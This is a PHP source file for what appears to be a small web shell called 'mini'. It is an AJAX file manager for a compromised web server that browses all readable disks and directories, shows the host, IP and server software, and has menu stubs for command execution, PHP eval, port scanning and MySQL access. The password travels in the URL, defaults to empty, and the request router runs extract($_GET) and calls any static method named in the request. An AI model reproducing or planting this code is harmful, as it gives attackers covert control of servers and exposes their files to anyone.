//<?php
run();
class project {
  static protected function js(){
    $js=<<<HTML
<script type="text/javascript">
function ajax(arg, type) {
        if ($("load")) {
                $("load").style.display = "block";
                $("load").innerHTML = "正在载入......";
        }
        if (type == 2 || arg == 2) $("load").innerHTML = "功能陆续完善中......";
        if (type == 1) arg = '?action=show&dir=' + arg;
        var options = {};
        options.url = arg ? arg : '?action=show';
        options.listener = callback;
        options.method = 'GET';
        var request = XmlRequest(options);
        request.send(null);
}

function XmlRequest(options) {
        var req = false;
        if (window.XMLHttpRequest) {
                var req = new XMLHttpRequest();
        } else if (window.ActiveXObject) {
                var req = new window.ActiveXObject('Microsoft.XMLHTTP');
        }
        if (!req) return false;
        req.onreadystatechange = function() {
                if (req.readyState == 4 && req.status == 200) {
                        options.listener.call(req);
                }
        };
        req.open(options.method, options.url, true);
        return req;
}

function callback() {
        var json = eval("(" + this.responseText + ")");
        if (json.status == 'off') $("login").style.display = "block";
        if (json.status == 'close') {
                location.replace(location.href);
        }
        if (json.status == 'ok') {
                ajax();
                document.body.innerHTML = json.data;
        }
        if (json.node_data) $("show").innerHTML = json.node_data;
        if (json.time) $("runtime").innerHTML = json.time;
        if (json.memory) $("memory").innerHTML = json.memory;
        if ($("load")) {
                $("load").style.display = "none";
        }
}

function reload() {
        var options = {};
        options.url = '?action=init';
        options.listener = callback;
        options.method = 'GET';
        var request = XmlRequest(options);
        request.send(null);
}

function addEvent(obj, evt, fn) {
        if (obj.addEventListener) {
                obj.addEventListener(evt, fn, false);
        } else if (obj.attachEvent) {
                obj.attachEvent('on' + evt, fn);
        }
}

function init() {
        $();
        login();
        reload();
}
function login() {
        $("login_open").onclick = function() {
                var pwd = $("pwd").value;
                if (pwd) ajax('?action=authentication&pwd=' + pwd);
        }
}

function $(d) {
        return document.getElementById(d);
}
addEvent(window, 'load', init);
   </script>
HTML;
  return $js;
  }
  static protected function css(){
  $css=<<<HTML
   <style>
     input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}a{color:#00f;text-decoration:underline;}a:hover{color:#f00;text-decoration:none;}body{font:12px Arial,Tahoma;line-height:16px;margin:0;padding:0;}#header{height:20px;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}#header .left{float:left;}#header .right{float:right;}#menu{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}#content{margin:0 auto;width:98%;}#content h2{margin-top:15px;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}#content #base,#content #base2{background:#eee;margin-bottom:10px;}#base input{float:right;border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;margin:5px 10px;}.cdrom{padding:5px;margin:auto 7px;}.h{margin-top:8px;}#base2 .input{font:12px Arial,Tahoma;background:#fff;border:1px solid #666;padding:2px;height:18px;}#base2 .bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}dl,dt,dd{margin:0;}.focus{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}.fff{background:#fff}dl{margin:0 auto;width:100%;}dt,dd{overflow:hidden;border-top:1px solid white;border-bottom:1px solid #DDD;background:#F1F1F1;padding:5px 15px 5px 5px;}dt{border-top:1px solid white;border-bottom:1px solid #DDD;background:#E9E9E9;font-weight:bold;padding:5px 15px 5px 5px;}dt span,dd span{width:19%;display:inline-block;text-indent:0em;overflow:hidden;}#footer{padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;}#load{position:fixed;right:0;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;display:none;}.in{width:40px;text-align:center;}#login{display:none;}
    </style>
HTML;
 return $css;
}
  static function init() {
    project::authentication();
    self::headers();
  }
 function show(){
    project::authentication();
    self::G('runtime');
    header ("Cache-Control: no-cache, must-revalidate");  
    header ("Pragma: no-cache"); 
    header("Content-type:text/html;charset=utf-8");
    $file = !empty($_GET["dir"]) ? iconv("UTF-8", "GBK",urldecode($_GET["dir"])) ."/" : iconv("UTF-8", "GBK", sprintf("%s%s",rtrim(__ROOT__,"/"),"/"));
    $file=strtolower($file);
    if (!is_readable($file)) return false;
    $array=scandir($file);
    foreach($array as $disk){
        if($disk==".." ||$disk == "." ) continue;
        if (is_dir($file.$disk)) $dir[] = $disk;
        elseif(is_file($file.$disk)) $files[] = $disk;
        else $disk=array();
    }
    if (!isset($dir)) $dir = array();
    if (!isset($files)) $files = array();
    $return=<<<HTML
 <!-- return -->
 <dl>
  <dt>
    <span class="in">　</span>
    <span>Filename</span>
    <span>Last modified</span>
    <span>Size</span>
    <span>Chmod / Perms</span>
    <span>Action</span>
  </dt>
  <dd >
    <span class="in">
    -
    </span>
    <span>
      <a href="javascript:;;;" name="{back}" onclick="ajax(this.name,1)">Parent Directory</a>
    </span>
    <span></span>
    <span></span>
    <span></span>
     <span></span>
  </dd>
  {file}
 </dl>
HTML;
  $return_file=<<<HTML
  <!-- file -->
  <dd class="{className}" onmouseover="this.className='focus';" onmouseout="this.className='{className}';">
    <span class="in">
     <input name="dl[]" type="checkbox" value="{return_link}" onclick="ajax(this.name,2)">
    </span>
    <span>
    <a href="javascript:;;;" name="{return_link}" onclick="{return_onclick}">{return_file}</a>
    </span>
    <span>
     <a href="javascript:;;;" name="{return_link}" onclick="ajax(this.name,2)">{return_time}</a>
    </span>
    <span>{return_size}</span>
    <span>
     <a href="javascript:;;;" name="{return_link}" onclick="ajax(this.name,2)">{return_chmod}</a> / 
     <a href="javascript:;;;" name="{return_link}" onclick="ajax(this.name,2)">{return_perms}</a>
    </span>
    <span>
     {is_folder}
   </span>
  </dd>
HTML;
    $document=array_merge($dir,$files);
    foreach($document as $i=>$gbk){
        $utf8=iconv("GBK", "UTF-8",$gbk);
        $utf8_file=iconv("GBK", "UTF-8",$file);
        $className= $i % 2 ? "dd" : "fff";
        if(is_dir($file.$gbk)){
            $return_onclick="ajax(this.name,1)";
            $return_folder=sprintf('
            <a href="javascript:;;;" name="%s" onclick="ajax(this.name,2)">Rename</a>',
            urlencode($utf8_file.$utf8));
        }
        if(is_file($file.$gbk)){
            $return_onclick="ajax(this.name,2)";
            $return_folder=sprintf('
            <a href="javascript:;;;" name="%s" onclick="ajax(this.name,2)">Down</a> | 
            <a href="javascript:;;;" name="%s" onclick="ajax(this.name,2)">Copy</a> | 
            <a href="javascript:;;;" name="%s" onclick="ajax(this.name,2)">Edit</a> | 
            <a href="javascript:;;;" name="%s" onclick="ajax(this.name,2)">Rename</a>',
            urlencode($utf8_file.$utf8),
            urlencode($utf8_file.$utf8),
            urlencode($utf8_file.$utf8),
            urlencode($utf8_file.$utf8));
        }
        $search=array('{className}',
                      '{return_file}',
                      '{return_time}',
                      '{return_size}',
                      '{return_chmod}',
                      '{return_perms}',
                      '{return_link}',
                      '{return_onclick}',
                      '{is_folder}',
                      );
        $replace=array($className,
                       $utf8,
                       self::perms($file.$gbk,3),
                       self::perms($file.$gbk,4),
                       self::perms($file.$gbk,1),
                       self::perms($file.$gbk,2),
                       urlencode($utf8_file.$utf8),
                       $return_onclick,
                       $return_folder,
                       );
        $directory['html'].=str_replace($search,$replace,$return_file);                  
    }
    
    $directory['node_data']=str_replace(array('{file}','{back}'),
                                   array($directory['html'],urlencode(dirname(iconv("GBK", "UTF-8",$file)))),
                                   $return);
    unset($directory['html']);
    $directory['folder']=count($dir);
    $directory['file']=count($files);
    $directory['time']=self::G('runtime','end');
    $directory['memory']=self::byte_format(memory_get_peak_usage());
    unset($dir,$files);
    if(!ob_start("ob_gzhandler")) ob_start();
    echo json_encode($directory);
    ob_end_flush();
    //print_r($directory);
    exit;
}

static protected function perms($file, $type = '1') {
    if ($type == 1) {
      return substr(sprintf('%o', fileperms($file)), -4);
    }
    if ($type == 2) {
      return self::getperms($file);
    }
    if ($type == 3) {
      return date('Y-m-d h:i:s', filemtime($file));
    }
    if ($type == 4) {
      return is_dir($file) ? 'directory' : self::byte_format(sprintf("%u",
        filesize($file)));
    }
  }
  static protected function headers() {
    header ("Cache-Control: no-cache, must-revalidate");  
    header ("Pragma: no-cache");  
    $eof = <<< HTML
<div id="load">
</div>
<div id="header">
  <div class="left">
  {host}({ip})
  </div>
  <div class="right">
  {uname} software:{software} 
  </div>
</div>
<div id="menu">
    {menu}
</div>
<div id="content">
<h2>File Manager - Current disk free {disktotal}</h2>
  <div id="base">
    <input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button" />
    <div class="cdrom">
      {current} - {chmod} / {perms} 
    </div>
    <div class="cdrom">
      {cdrom}
    </div>
  </div>
  <div class="h"></div>
  <div id="base2">
    <div class="cdrom">
      {action}
    </div>
    <div class="cdrom">
      Find string in files(current folder): <input class="input" name="findstr" value="" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input class="input" name="writabledb" value="php,cgi,pl,asp,inc,js,html,htm,jsp" type="text" /><input name="dir" value="C:/freebsd/" type="hidden" /> 
    </div>
  </div>
  <!-- return -->
  <div id="show">
  </div>
  <!-- end -->
</div> 
<div class="h"></div>
<div id="footer">
  <span style="float:right;">
     Processed in <span id="runtime"></span> second(s) {gzip} usage:<span id="memory">{memory}</span>
  </span>
  Powered by {copyright}
  . Copyright (C) 2010-2012
   All Rights Reserved.
</div>
HTML;
    $actions = array(
      'WebRoot' => $_SERVER['DOCUMENT_ROOT'],
      'Create Directory' => '2',
      'Create File' => '2',
      );
    $menus = array(
      'Logout',
      'File Manager' => $_SERVER['DOCUMENT_ROOT'],
      'MYSQL Manager' => '2',
      'MySQL Upload' => '2',
      'Execute Command' => '2',
      'PHP Variable' => '2',
      'Port Scan' => '2',
      'Eval PHP Code' => '2');
    $menu = '';
    $action = '';
    $logout = array_shift($menus);
    $menu .= sprintf('<a href="javascript:;;;" name="%s" onclick="ajax(this.name)">%s</a> | ',
      '?action=logout', $logout);
    foreach ($menus as $key => $val) {
      $menu .= sprintf('<a href="javascript:;;;" name="%s" onclick=ajax(this.name,1)>%s</a> | ',
        $val, $key, "\r\n");
    }
    foreach ($actions as $key => $val) {
      $action .= sprintf('<a href="javascript:;;;" name="%s" onclick=ajax(this.name,1)>%s</a> | ',
        $val, $key, "\r\n");
    }
    $serach = array(
      '{title}',
      '{host}',
      '{ip}',
      '{uname}',
      '{software}',
      '{menu}',
      '{copyright}',
      '{cdrom}',
      '{action}',
      '{gzip}',
      '{memory}',
      '{js}',
      '{css}');
    $replace = array(
      title,
      $_SERVER['HTTP_HOST'],
      $_SERVER['SERVER_ADDR'],
      php_uname('s'),
      $_SERVER["SERVER_SOFTWARE"],
      trim($menu, '| '),
      copyright,
      self::disk(),
      trim($action, '| '),
      gzip,
      self::byte_format(memory_get_peak_usage()),
      self::js(),
      self::css());
    $eof = str_replace($serach, $replace, $eof);
    $json['status']='ok';
    $json['data']=$eof;
    if(!ob_start("ob_gzhandler")) ob_start();
    echo json_encode($json);
    ob_end_flush();
    exit;
  }
  static protected function disk() {
    if (is_win) {
      $cdrom = range('A', 'Z');
      foreach ($cdrom as $disk) {
        $disk = sprintf("%s%s", $disk, ':');
        if (is_readable($disk)) {
          $return .= sprintf('<a href="javascript:;;;" name="%s" onclick="ajax(this.name,1)">disk %s</a> | ',
            $disk, $disk);
        }
      }
      return trim($return, "| ");
    }
    else {
      $cdrom = scandir('/');
      foreach ($cdrom as $disk) {
        if ($disk == '.' || $disk == '..') continue;
        $disk = sprintf("%s%s", '/', $disk);
        if (is_readable($disk)) {
          if (is_dir($disk)) $return .= sprintf('<a href="javascript:;;;" name="%s" onclick="ajax(this.name,1)">%s</a> | ',
              $disk, str_replace('/', '', $disk));
        }
      }
      return trim($return, "| ");
    }
  }
  static function G($start, $end = '', $dec = 6) {
    static $_info = array();
    if (is_float($end)) { // 记录时间
      $_info[$start] = $end;
    }
    elseif (!empty($end)) { // 统计时间
      if (!isset($_info[$end])) $_info[$end] = microtime(true);
      return number_format(($_info[$end] - $_info[$start]), $dec);
    }
    else { // 记录时间
      $_info[$start] = microtime(true);
    }
  }
  static function authentication() {
    if (true == password) {
      //if(!empty($_POST['pwd']) && !preg_match('/^[a-z0-9]+$/',$_POST['pwd'])) exit;
      if(!empty($_GET['pwd']) && strlen(password) == 32) $password = hash(crypt, $_GET['pwd']); 
      else $password = $_GET['pwd'];
      if((true == $password) && $password !==password) die('{"error":"pwd error!"}');
      if((true == $password) && $password == password) {
        setcookie('verify', $password, time() + 3600);
        self::headers();
        exit;
      }
      if (!isset($_COOKIE['verify']) || empty($_COOKIE['verify']) || (string )$_COOKIE['verify']
        !== password) {
        exit('{"status":"off"}');
      }
    }
  }
  public function logout() {
    setcookie('verify', '', time() - 3600*8);
    unset($_COOKIE['verify']);
    clearstatcache();
    die('{"status":"close"}');
  }
  static function login() {
    $login=<<<LOGIN
<!DOCTYPE HTML>
<head>
<meta http-equiv="content-type" content="text/html" />
<meta http-equiv="content-type" charset="UTF-8" />
<title>{title}</title>
{css}
{js}
</head>
<body>
  <div id="load">
   </div>
   <div class="h"></div>
   <div id="login">
     <span style="font:11px Verdana;">
       Password: 
     </span>
     <input id="pwd" name="pwd" type="password" size="20">
     <input id="login_open" type="button" value="Login">
  </div>
</body>
</html>
LOGIN;
    $search=array('{css}',
                  '{title}',
                  '{js}');
    $replace=array(self::css(),
                   title,
                   self::js());
    echo str_replace($search,$replace,$login);
  }
  static protected function getperms($path) {
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
      $info = 's';
    }
    elseif (($perms & 0xA000) == 0xA000) {
      $info = 'l';
    }
    elseif (($perms & 0x8000) == 0x8000) {
      $info = '-';
    }
    elseif (($perms & 0x6000) == 0x6000) {
      $info = 'b';
    }
    elseif (($perms & 0x4000) == 0x4000) {
      $info = 'd';
    }
    elseif (($perms & 0x2000) == 0x2000) {
      $info = 'c';
    }
    elseif (($perms & 0x1000) == 0x1000) {
      $info = 'p';
    }
    else {
      $info = '?????????';
      return $info;
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms &
      0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms &
      0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms &
      0x0200) ? 'T' : '-'));
    return $info;
  }
  static protected function byte_format($size, $dec = 2) {
    $a = array(
      "B",
      "KB",
      "MB",
      "GB",
      "TB",
      "PB");
    $pos = 0;
    while ($size >= 1024) {
      $size /= 1024;
      $pos++;
    }
    return round($size, $dec) . "" . $a[$pos];
  }
}
function run(){
if(!defined(password)) define('password','');
if(!defined(title)) define('title','mini');
if(!defined(copyright)) define('copyright', 'E');
define('self',$_SERVER["SCRIPT_NAME"]);
define('crypt', 'ripemd128');
define('__ROOT__', $_SERVER["DOCUMENT_ROOT"]);
define('is_win','win' == substr(strtolower(PHP_OS),0,3));
date_default_timezone_set('asia/shanghai');
define('gzip',function_exists("ob_gzhandler") ? 'gzip on' : 'gzip off');
extract($_GET);
header ("Cache-Control: no-cache, must-revalidate");  
header ("Pragma: no-cache");  
$action=!empty($action) ? strtolower(trim($action,'/')) : 'login';
if (!is_callable(array('project', $action))) return false;
if (!method_exists('project', $action)) return false;
call_user_func(array('project', $action));
}
//?>